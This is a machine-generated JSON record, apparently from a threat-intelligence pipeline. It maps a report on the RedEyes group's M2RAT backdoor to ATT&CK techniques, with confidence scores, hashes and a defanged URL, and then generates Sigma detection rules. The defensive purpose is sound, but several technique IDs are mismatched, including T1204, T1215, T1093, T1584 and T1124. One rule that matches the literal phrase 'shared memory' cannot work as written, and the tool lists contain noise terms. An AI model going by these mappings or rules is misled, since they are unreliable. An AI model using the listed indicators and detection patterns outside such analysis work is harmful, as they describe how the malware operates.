        "confidence_score": 0.68,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.069,
          "tool_mentions": 1.0,
          "context_richness": 0.86,
          "multiple_sources": 0.5
        },
        "indicators": [
          "7bab405fbc6af65680443ae95c30595d"
        ],
        "tools": [
          "reg",
          "ping",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "Trojan/Win.Loader.C5359534",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "eea1f088-8bc3-40e4-880a-d8f64a4e75b5",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Downloader",
        "attack_id": "T1105",
        "tactic": "Command and Control",
        "description": "Attacker used Downloader/PS.Generic.SC185661",
        "confidence_score": 0.68,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.069,
          "tool_mentions": 1.0,
          "context_richness": 0.86,
          "multiple_sources": 0.5
        },
        "indicators": [
          "9083c1ff01ad8fabbcd8af1b63b77e66"
        ],
        "tools": [
          "reg",
          "ping",
          "Downloader/PS.Generic.SC185661",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "d1579ab7-d918-49fa-ac6e-38c8c5ab9ec0",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Data Encoding",
        "attack_id": "T1132",
        "tactic": "Defense Evasion",
        "description": "The threat actor encoded the CMD command in BASE64 before sending it to the affected host",
        "confidence_score": 0.677,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.368,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "BASE64 encoding"
        ],
        "tools": [
          "reg",
          "ping",
          "Malware",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "1764d539-314d-4a4e-9b2c-76ca93a77313",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Data Encoding",
        "attack_id": "T1132",
        "tactic": "Exfiltration",
        "description": "The command execution result is encoded in BASE64 before sending it to the threat actor's server",
        "confidence_score": 0.677,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.368,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "BASE64-encoded"
        ],
        "tools": [
          "reg",
          "ping",
          "M2RAT",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "2309b53e-4ff6-457d-941a-1ff0b5d4c3b0",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Download Malware-Tools",
        "attack_id": "T1215",
        "tactic": "Defense Evasion",
        "description": "The threat actor downloaded an image file containing malware from the threat actor's server",
        "confidence_score": 0.676,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.322,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "JPEG image file",
          "hxxps://www.*****elearning.or[.]kr/popup/handle/1.html"
        ],
        "tools": [
          "reg",
          "ping",
          "Malware",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "d70e0a25-9c9f-4d9f-bdc1-a432539bcedd",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Data Exfiltration",
        "attack_id": "T1041",
        "tactic": "Exfiltration",
        "description": "The M2RAT backdoor sends keylogging data and screenshot logs to the threat actor's server",
        "confidence_score": 0.676,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.322,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "keylogging data",
          "screenshot logs"
        ],
        "tools": [
          "reg",
          "ping",
          "M2RAT",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "ce88e90a-7c53-454a-955e-d66e3d4e65b0",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Remote Access Tools",
        "attack_id": "T1219",
        "tactic": "Command and Control",
        "description": "M2RAT establishes remote control command by transmitting CMD commands from the threat actor's server",
        "confidence_score": 0.676,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.322,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "M2RAT",
          "CMD commands"
        ],
        "tools": [
          "reg",
          "ping",
          "M2RAT",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "326b767a-85a0-4732-accb-d3a5fd07be2f",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Exploitation of Vulnerability",
        "attack_id": "T1204",
        "tactic": "Initial Access",
        "description": "The RedEyes group exploited the HWP EPS vulnerability (CVE-2017-8291) to distribute malware",
        "confidence_score": 0.675,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.62,
          "description_detail": 0.276,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "CVE-2017-8291",
          "HWP EPS vulnerability",
          "Form.hwp"
        ],
        "tools": [
          "reg",
          "ping",
          "Sc",
          "HWP",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "19dcd412-a422-4635-87d9-afbc0276018f",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Create or Modify System Process",
        "attack_id": "T1543",
        "tactic": "Persistence",
        "description": "The threat actor created a new process (lskdjfel.exe) in the %temp% path",
        "confidence_score": 0.669,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.314,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "%temp%\\lskdjfel.exe"
        ],
        "tools": [
          "reg",
          "ping",
          "Malware",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "b27a724e-6dcf-45c5-acb1-ae09cd184711",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Archive Collected Data",
        "attack_id": "T1560",
        "tactic": "Exfiltration",
        "description": "Archiving collected data with password protection",
        "confidence_score": 0.667,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.7,
          "description_detail": 0.138,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "RAR.exe",
          "-df",
          "-r",
          "-hp",
          "-m1"
        ],
        "tools": [
          "reg",
          "ping",
          "Winrar",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "2081442b-6650-4d60-9f66-1411162543ed",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Exfiltration Over Alternative Protocol",
        "attack_id": "T1048",
        "tactic": "Exfiltration",
        "description": "Exfiltrating data to the threat actor's server",
        "confidence_score": 0.658,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.62,
          "description_detail": 0.161,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "result_[number]",
          "_Encoded MAC Address Value_cap",
          "_Encoded MAC Address Value_2"
        ],
        "tools": [
          "reg",
          "ping",
          "Malware",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "763958e8-b49b-4121-8cfe-ca726ee9f6bf",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Process Injection",
        "attack_id": "T1055",
        "tactic": "Defense Evasion",
        "description": "The M2RAT backdoor operates after being injected into explorer.exe",
        "confidence_score": 0.653,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.207,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "explorer.exe"
        ],
        "tools": [
          "reg",
          "ping",
          "M2RAT",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "8f29289d-64ea-4a93-ad24-8590115d36d4",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Process Hollowing",
        "attack_id": "T1093",
        "tactic": "Defense Evasion",
        "description": "The threat actor injected malware into explorer.exe",
        "confidence_score": 0.652,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.161,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "explorer.exe",
          "M2RAT"
        ],
        "tools": [
          "reg",
          "ping",
          "Malware",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "f60eba17-0cf4-4f1e-b3d5-7a1c88384875",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Server Software",
        "attack_id": "T1584",
        "tactic": "Command and Control",
        "description": "Threat actor's server transmits CMD commands to M2RAT",
        "confidence_score": 0.65,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.184,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "threat actor's server"
        ],
        "tools": [
          "reg",
          "ping",
          "M2RAT",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "123c0b6c-21bf-4ed8-afa8-6f12631d9416",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Data Staging",
        "attack_id": "T1074",
        "tactic": "Exfiltration",
        "description": "Staging data in the %TEMP% path before exfiltration",
        "confidence_score": 0.65,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.184,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "%TEMP%\\Y_%m_%d_%H_%M_%S"
        ],
        "tools": [
          "reg",
          "ping",
          "Malware",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "7662db78-9243-4b7b-aa6f-23d3f4f552a7",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Application Window Discovery",
        "attack_id": "T1010",
        "tactic": "Discovery",
        "description": "Discovering application windows for data exfiltration",
        "confidence_score": 0.649,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.138,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "PhoneDataCp",
          "PhoneDeviceManager"
        ],
        "tools": [
          "reg",
          ".NET",
          "ping",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "b7df559e-e33f-4a95-8718-eaf63fa76457",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Input Capture",
        "attack_id": "T1056",
        "tactic": "Collection",
        "description": "Capturing input data from mobile phones",
        "confidence_score": 0.649,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.138,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "PhoneDeviceManager.pdb",
          "M2RAT"
        ],
        "tools": [
          "reg",
          ".NET",
          "ping",
          "M2RAT",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "a933bce9-d179-45ec-b723-1ecdc57f728f",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Command and Scripting Interpreter",
        "attack_id": "T1059",
        "tactic": "Execution",
        "description": "Using PowerShell and cmd for execution",
        "confidence_score": 0.649,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.138,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "Powershell",
          "cmd"
        ],
        "tools": [
          "reg",
          "ping",
          "Sc",
          "mshta",
          "Powershell",
          "PowerShell",
          "cve",
          "at",
          "powershell",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "3b3540f2-e909-492f-bcd5-0f492d19a78c",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Data Staging",
        "attack_id": "T1074",
        "tactic": "Command and Control",
        "description": "Attacker used PE file for data staging",
        "confidence_score": 0.646,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.161,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "7bab405fbc6af65680443ae95c30595d"
        ],
        "tools": [
          "reg",
          "ping",
          "Sc",
          "PE file",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "724d6eb8-1de8-43fb-ba74-2168b52bf5d7",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Exploitation for Client Execution",
        "attack_id": "T1204",
        "tactic": "Execution",
        "description": "Attacker exploited EPS file for execution",
        "confidence_score": 0.643,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.138,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "8b666fc04af6de45c804d973583c76e0"
        ],
        "tools": [
          "reg",
          "ping",
          "EPS file",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "27a76eaf-be4b-4eb9-b89c-9952a5911d0c",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Command and Scripting Interpreter",
        "attack_id": "T1059",
        "tactic": "Execution",
        "description": "Attacker used cmd for execution",
        "confidence_score": 0.639,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.115,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "cmd.exe"
        ],
        "tools": [
          "reg",
          "ping",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "73bc2224-56d5-4c78-bac2-365845f54f4f",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Process Injection",
        "attack_id": "T1055",
        "tactic": "Defense Evasion",
        "description": "Detected Process Injection activity via NLP pattern matching",
        "confidence_score": 0.636,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.214,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "reg",
          "ping",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "3812cd34-0272-4a55-89fd-57d76a3bd7e5",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Application Layer Protocol",
        "attack_id": "T1071",
        "tactic": "Command And Control",
        "description": "Detected Application Layer Protocol activity via NLP pattern matching",
        "confidence_score": 0.633,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.199,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "reg",
          "ping",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "484887b8-9a33-4b47-8375-17191f0c201b",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Remote Access Tool",
        "attack_id": "T1219",
        "tactic": "Command and Control",
        "description": "Attacker used M2RAT",
        "confidence_score": 0.632,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.069,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "4488c709970833b5043c0b0ea2ec9fa9"
        ],
        "tools": [
          "reg",
          "ping",
          "M2RAT",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "f39d13c9-d248-4b04-81fa-8238521ed6e5",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Command and Scripting Interpreter",
        "attack_id": "T1059",
        "tactic": "Execution",
        "description": "Detected Command and Scripting Interpreter activity via NLP pattern matching",
        "confidence_score": 0.631,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.185,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "reg",
          "ping",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "ba205bb7-f4b3-48f7-a841-019177f768d1",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Obfuscated Files or Information",
        "attack_id": "T1027",
        "tactic": "Defense Evasion",
        "description": "Detected Obfuscated Files or Information activity via NLP pattern matching",
        "confidence_score": 0.631,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.185,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "reg",
          "ping",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "9bd010dd-7f57-412e-ac77-269099e260d6",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Exfiltration Over C2 Channel",
        "attack_id": "T1041",
        "tactic": "Exfiltration",
        "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching",
        "confidence_score": 0.631,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.185,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "reg",
          "ping",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "abc4d884-d29f-4bd2-9c85-4fb0b5f9f077",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Exploit Public-Facing Application",
        "attack_id": "T1190",
        "tactic": "Initial Access",
        "description": "Detected Exploit Public-Facing Application activity via NLP pattern matching",
        "confidence_score": 0.628,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.162,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "reg",
          "ping",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "f3a13a36-0aa8-4ef9-b9d6-af987cea423e",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Archive Collected Data",
        "attack_id": "T1560",
        "tactic": "Collection",
        "description": "Detected Archive Collected Data activity via NLP pattern matching",
        "confidence_score": 0.628,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.162,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "reg",
          "ping",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "50e0e0ea-6580-44d0-a3b8-48e3687b6319",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Screen Capture",
        "attack_id": "T1113",
        "tactic": "Collection",
        "description": "Detected Screen Capture activity via NLP pattern matching",
        "confidence_score": 0.624,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.139,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "reg",
          "ping",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "9036e5f9-016b-4c5f-bae2-e512d304192f",
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "technique_name": "Registry Run Keys",
        "attack_id": "T1547.001",
        "tactic": "Persistence",
        "description": "Detected Registry Run Keys activity via NLP pattern matching",
        "confidence_score": 0.623,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.5,
          "description_detail": 0.199,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "reg",
          "ping",
          "Sc",
          "mshta",
          "Powershell",
          "powershell",
          "cve",
          "at",
          "xor",
          "shellcode",
          "net",
          "cmd",
          "base64",
          "apt",
          "rar"
        ],
        "extraction_method": "nlp_indicator"
      }
    ]
  },
  "rules": {
    "status": "success",
    "summary": {
      "ttps_processed": 52,
      "rules_generated": 52,
      "langchain_generations": 188,
      "fallback_generations": 11,
      "errors": 0,
      "processing_time_ms": 1973354.2
    },
    "rule_generation_results": [
      {
        "ttp_id": "unknown",
        "technique_name": "Shared Memory",
        "status": "success",
        "rule": {
          "title": "Detection of Shared Memory Section Creation (Defense Evasion)",
          "description": "Detects processes that create or interact with shared memory sections, which may be used by malware such as M2RAT to execute commands from a remote server. The rule looks for the indicator \"shared memory\" in command line arguments, a common artifact of shared memory usage.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_sharedmem": {
              "CommandLine|contains": "shared memory"
            },
            "condition": "selection_sharedmem"
          },
          "falsepositives": [
            "Legitimate applications that use shared memory for inter\u2011process communication (e.g., explorer.exe, svchost.exe, chrome.exe, Microsoft Office components).",
            "Debugging or development tools that create named shared memory sections (e.g., Visual Studio, WinDbg).",
            "System utilities that employ shared memory for performance optimization."
          ],
          "level": "medium",
          "tags": [
            "attack.defense_evasion",
            "attack.t1124",
            "custom.shared_memory"
          ],
          "ttp_id": "unknown",
          "technique_name": "Shared Memory",
          "generation_method": "langchain",
          "id": "209fc45a-ad77-4d48-b10d-df7bd909797b",
          "siem_verification": {
            "rule_id": "209fc45a-ad77-4d48-b10d-df7bd909797b",
            "attack_id": "83bdc967-fef3-4983-9894-10eaaf0b4a05",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 490.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Steganography",
        "status": "success",
        "rule": {
          "title": "Steganography Detection via JPEG with XOR Key",
          "description": "Detects execution of tools that decode or process JPEG image files containing a known XOR key used for steganographic malware embedding, and network connections to the malicious domain wallup.net.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_certutil": {
              "Image|endswith": "\\certutil.exe",
              "CommandLine|contains": ".jpg"
            },
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": ".jpg"
            },
            "selection_generic": {
              "CommandLine|contains": ".jpg"
            },
